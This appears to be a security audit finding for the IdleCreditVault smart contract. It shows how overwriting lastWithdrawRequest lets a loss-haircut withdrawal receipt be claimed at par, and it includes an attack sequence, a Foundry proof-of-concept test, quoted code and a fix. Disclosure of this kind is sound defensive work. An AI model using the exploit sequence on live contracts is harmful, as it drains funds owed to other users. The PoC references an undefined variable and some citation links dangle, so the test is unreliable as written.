### Title
Stale `lastWithdrawRequest` lets a loss-haircut receipt bypass `lossRecoveryPriceByEpoch` and claim at par - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault` keys a user's loss-adjusted withdrawal receipt to a single slot: `lastWithdrawRequest[_user]`. When `collectWithdrawFunds` funds an epoch short, it stores the haircut in `lossRecoveryPriceByEpoch[epochNumber]` and clears `pendingWithdraws`. The only code path that ever applies that haircut is `_claimLossAdjustedWithdrawRequest`, which looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`. If the user makes *any* new withdraw request before claiming, `requestWithdraw` overwrites `lastWithdrawRequest[_user]` with the new epoch. The haircut epoch's receipt remains inside `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][lossEpoch]`, but the loss-adjusted path now resolves a different epoch key whose price is `0` and silently returns. The stale receipt is then paid **at par** by `_claimFundedWithdrawRequest` — a use-after-free-style dangling pointer where the "freed" haircut receipt is reused through the funded-claim path. ### Finding Description
Sequence:

1. Running epoch `e`, attacker calls `requestWithdraw(X)` (via the CDO). `withdrawsRequestsByEpoch[attacker][e] = X`, `withdrawsRequests[attacker] = X`, `lastWithdrawRequest[attacker] = e`, and a receipt of `X` strategy tokens is minted.
2. The manager stops epoch `e` with `stopEpochWithDuration(_lossAmount)`; the borrower underfunds, so the CDO calls `collectWithdrawFunds(amount < pendingBasis)`. This sets `lossRecoveryPriceByEpoch[e] = p < RECOVERY_FULL` and zeroes `pendingWithdraws`. Only `p·X` underlying was transferred into the strategy for the attacker's receipt. [3](#0-2) 
3. In the next buffer/running phase the attacker calls `requestWithdraw(Y)` for a dust amount `Y`. `requestWithdraw` sets `lastWithdrawRequest[attacker] = e+1`, freeing the bookkeeping link to epoch `e` while `withdrawsRequestsByEpoch[attacker][e]` still holds `X`.
4. Epoch `e+1` stops normally and is fully funded. Now `epochNumber > lastWithdrawRequest[attacker]`, so the gate in `_claimFundedWithdrawRequest` passes. [4](#0-3) 
5. `claimWithdrawRequest` runs: `_claimLossAdjustedWithdrawRequest` computes `lossEpoch = lastWithdrawRequest = e+1`, sees `lossRecoveryPriceByEpoch[e+1] == 0`, returns 0 — the haircut on epoch `e` is never applied. `_claimFundedWithdrawRequest` then pays `withdrawsRequests[attacker] = X + Y` at par and burns the receipt.

The strategy only ever received `p·X + Y` for those receipts, so the attacker withdraws `(1-p)·X` more than was funded. No guard stops this: the comments at lines 323–325 explicitly bless re-requesting before claiming, and `_transferFundedClaim`'s reserve check only protects `defaultRecoveryReserve` (post-default), not pre-default funded claims. [5](#0-4) 

### Impact Explanation
Direct theft / insolvency. The attacker redeems a haircut receipt at par, extracting `(1 - p) · X` underlying that belongs to other pending receipt holders and LPs. With a 50% loss epoch and `X = 1_000_000 USDC`, the attacker steals 500,000 USDC; the strategy's funded-claim balance is short the same amount, so the last claimants' `claimWithdrawRequest` calls revert on insufficient balance — permanent freezing/theft of unclaimed funds for honest users.

### Likelihood Explanation
Requires a `stopEpochWithDuration` loss epoch (honest manager/borrower action, within scope), then only unprivileged attacker transactions: a second `requestWithdraw` and a `claimWithdrawRequest` in the following epoch. Any tranche-token holder can do this; no privileged role, oracle manipulation, or default is needed. The bug is deterministic once a loss-adjusted epoch exists and the victim re-requests before claiming — a flow the code explicitly supports.

### Recommendation
Track loss-adjusted receipts independently of `lastWithdrawRequest`. Either (a) iterate/check `lossRecoveryPriceByEpoch` for *every* epoch key present in `withdrawsRequestsByEpoch[_user]` (store a per-user list/bitmap of loss epochs), or (b) split the receipt into a separate `lossAdjustedRequests[_user]` bucket at `collectWithdrawFunds` time, paying it pro-rata and only routing genuinely fully-funded epochs to `_claimFundedWithdrawRequest`. Also consider preventing `requestWithdraw` from overwriting `lastWithdrawRequest` while the user holds an unclaimed receipt in an epoch with a non-zero `lossRecoveryPriceByEpoch`.

### Proof of Concept
Foundry fork PoC sketch (modeled on `test/foundry/IdleCreditVault.t.sol` helpers `_startEpochAndCheckPrices`, `_stopCurrentEpoch`):

```solidity
function testLossHaircutBypassedByReRequest() external {
    uint256 X = 1_000_000 * ONE_SCALE;
    uint256 Y = 1 * ONE_SCALE;

    // epoch e: deposit + requestWithdraw(X) as attacker
    idleCDO.depositAA(X + Y);
    _startEpochAndCheckPrices(0);
    uint256 principal = cdoEpoch.requestWithdraw(X, address(AAtranche));

    // manager stops epoch e with a realized loss; borrower underfunds pending withdraws
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pending = IdleCreditVault(address(strategy)).pendingWithdraws();
    uint256 loss = pending / 2; // 50% haircut on pending receipts
    deal(defaultUnderlying, borrower, pending - loss + cdoEpoch.expectedEpochInterest());
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(loss, /*interest*/ 0); // -> collectWithdrawFunds(pending - loss)
    assertGt(IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(1), 0);

    // epoch e+1: attacker re-requests a dust withdraw -> lastWithdrawRequest moves off the loss epoch
    _startEpochAndCheckPrices(1);
    cdoEpoch.requestWithdraw(Y, address(AAtranche));

    // epoch e+1 ends fully funded
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, IdleCreditVault(address(strategy)).pendingWithdraws() + amount);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, cdoEpoch.expectedEpochInterest());

    // claim: loss path resolves epoch e+1 (price 0), funded path pays X+Y at par
    uint256 balBefore = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(address(this)) - balBefore;

    // funded was only X/2 + Y; attacker receives X + Y
    assertEq(paid, X + Y, "haircut bypassed");
    // strategy underlyings are now short X/2 -> later claimants revert
}
```

Expected result: `paid == X + Y` while the strategy only ever collected `X·p + Y` for those receipts, proving the haircut was skipped and other claimants' funds were consumed.

```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```
